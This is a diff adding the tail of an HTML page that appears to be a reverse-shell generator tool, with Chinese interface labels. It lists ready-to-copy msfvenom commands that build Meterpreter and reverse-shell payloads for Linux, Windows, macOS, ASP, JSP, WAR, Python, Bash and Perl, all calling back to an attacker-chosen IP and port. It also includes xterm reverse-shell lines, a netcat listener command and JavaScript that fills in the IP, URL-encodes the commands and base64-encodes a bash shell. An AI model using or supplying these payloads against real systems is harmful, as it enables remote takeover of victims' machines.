+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter004">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f elf &#x3e;reverse.elf</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter005">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f elf &#x3e; shell.elf</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter005',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter005','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter006">msfvenom -p windows/meterpreter/reverse_tcp LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f exe &#x3e; shell.exe</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter006',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter006','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter007">msfvenom -p osx/x86/shell_reverse_tcp LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f macho &#x3e; shell.macho</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter007',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter007','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter008">msfvenom -p windows/meterpreter/reverse_tcp LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f asp &#x3e; shell.asp</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter008',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter008','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter009">msfvenom -p java/jsp_shell_reverse_tcp LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f raw &#x3e; shell.jsp</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter009',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter009','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter010">msfvenom -p java/jsp_shell_reverse_tcp LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f war &#x3e; shell.war</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter010',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter010','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter011">msfvenom -p cmd/unix/reverse_python LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f raw &#x3e; shell.py</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter011',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter011','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter012">msfvenom -p cmd/unix/reverse_bash LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f raw &#x3e; shell.sh</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter012',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter012','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Meterpreter" lay-encode="true" id="Meterpreter013">msfvenom -p cmd/unix/reverse_perl LHOST="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>" LPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -f raw &#x3e; shell.pl</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('Meterpreter013',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('Meterpreter013','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- Meterpreter Shell反弹shell -->
+<!-- xterm反弹shell --> 
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="xterm" lay-encode="true" id="xterm">xterm -display 
+<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>:1
+Xnest :1
+xhost +targetip</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('xterm',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('xterm','enurl');">URL编码</button>
+                        </div>
+                    </div>
+<!-- xterm反弹shell --> 
+                  </div>
+                </div>
+
+<!-- shell列表 -->
+        </div>
+<!-- 结束 -->
+    </div>
+  </div>
+  <div class="layui-footer">
+    <!-- 底部固定区域 -->
+    © C1O2A3
+  </div>
+</div>
+<script src="./src/layui.js"></script>
+<script>
+//JavaScript代码区域
+layui.use(['form','element','layer','code'], function(){
+  $ = layui.jquery;
+  element = layui.element;
+  layer = layui.layer;
+  var form = layui.form
+  layui.code();
+  
+layui.form.on('radio(shell)', function(data){
+    // console.log(data.elem); //得到radio原始DOM对象
+    // console.log(data.value); //被点击的radio的value值
+    radioshell = data.value;
+    $(".radioshell").text(radioshell);
+    base64bash();
+})
+});
+</script>
+<script>
+// 复制开始
+function disableScrolling(){
+    var x=window.scrollX;
+    var y=window.scrollY;
+    window.onscroll=function(){window.scrollTo(x, y);};
+}
+function copy(item_id,enurl) {
+  disableScrolling();
+  var copyText = document.getElementById(item_id).textContent;
+  if (enurl =="enurl") {
+    var copyText = encodeURIComponent(copyText);
+  }
+  const textArea = document.getElementById('txt');
+  textArea.textContent = copyText;
+  textArea.select();
+  var flag = document.execCommand("copy");
+  if (flag ==true) {
+    layer.msg('复制成功');
+  }else{
+    layer.msg("复制失败");
+  }
+  enableScrolling();
+  return false;
+}
+function enableScrolling(){
+    window.onscroll=function(){};
+}
+// 复制结束
+  $(function(){
+     //输入框的值改变时触发
+    $("#ip").on("input",function(e){
+      //获取input输入的值
+      // console.log(e.delegateTarget.value);
+      text = e.delegateTarget.value;
+      newshell(text);
+      base64bash();
+    });
+  });
+  function base64bash() {
+    var shell = btoa(document.getElementById("bash001").textContent);
+    // alert(shell);
+
+    $(".base64bash").text(shell);
+  }
+  function newshell(text) {
+    $(".bash1ip").text(text);
+  }
+  $(function(){
+     //输入框的值改变时触发
+    $("#port").on("input",function(e){
+      //获取input输入的值
+      // console.log(e.delegateTarget.value);
+      text = e.delegateTarget.value;
+      newshellport(text);
+      base64bash(text);
+      // alert(text);
+    });
+  });
+  function newshellport(text) {
+    $(".bash1port").text(text);
+    $("#listener").text('nc -lvvp '+text);
+  }
+</script>
+</body>
+</html>
+      
